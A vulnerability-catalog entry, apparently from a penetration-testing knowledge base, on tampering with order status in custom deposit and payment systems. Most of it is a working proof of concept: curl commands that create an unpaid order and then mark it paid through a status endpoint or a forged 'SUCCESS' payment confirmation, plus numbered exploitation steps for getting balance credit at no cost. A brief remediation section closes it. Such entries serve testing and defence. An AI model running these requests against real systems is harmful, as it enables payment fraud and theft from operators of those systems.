---
id: "order-status-tamper"
title: "Order state-machine tampering (unpaid changed to paid / canceled orders credited again)"
kind: "business-logic"
cve: null
related-cves: null
cve-note: "None (business logic)"
severity: "critical"
cvss: 9.3
severity-basis: "cvss"
severity-note: null
product: "Custom deposit/order systems (financial impact)"
versions: "Any"
ports: "80, 443"
keywords: "order, state machine, tampering, unpaid, deposit, funds"
entry: "/api/order/status  /api/recharge/confirm"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (business logic flaws; no CVE)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

```
POST /api/order/create {"amount":100,"channel":"alipay"}
POST /api/order/status {"orderNo":"...","status":2}
GET  /api/order/detail?orderNo=
```

## Prerequisites

- An ordinary member account; ability to capture order-creation and status-query requests.

## PoC

```bash
# 1) Create an order without paying; record orderNo and the initial state
curl -s -X POST https://target/api/order/create -H "Authorization: Bearer <t>" \
  -H 'Content-Type: application/json' -d '{"amount":100,"channel":"alipay"}' | tee /tmp/o.json
ORDER=$(python3 -c "import json;print(json.load(open('/tmp/o.json'))['data']['orderNo'])")

# 2) Directly change the status to "paid"
curl -s -X POST https://target/api/order/status -H "Authorization: Bearer <t>" \
  -H 'Content-Type: application/json' -d "{\"orderNo\":\"$ORDER\",\"status\":2}"
curl -s "https://target/api/order/detail?orderNo=$ORDER" -H "Authorization: Bearer <t>" | head -c 200
# Confirmation: status changes to paid and the balance increases

# 3) Alternatively, forge a third-party result through the "confirm payment" endpoint
curl -s -X POST https://target/api/recharge/confirm -H "Authorization: Bearer <t>" \
  -d "{\"orderNo\":\"$ORDER\",\"tradeNo\":\"x\",\"status\":\"SUCCESS\"}"
```

## Exploitation Steps

1. First create an order (1 yuan) to establish the workflow;
2. Change the status directly through the status endpoint / forge a third-party result through the confirmation endpoint;
3. Success means a "zero-cost deposit"—critical financial impact;
4. Evidence: order number + status change + balance change (deposit only 1 yuan).

## Remediation and Mitigation

- Drive order status only through payment callbacks with signature verification; prohibit client endpoints from writing status;
- Validate state-machine transitions; reconcile against third-party transaction records.

## References

- OWASP WSTG-BUSL-01; CWE-841.
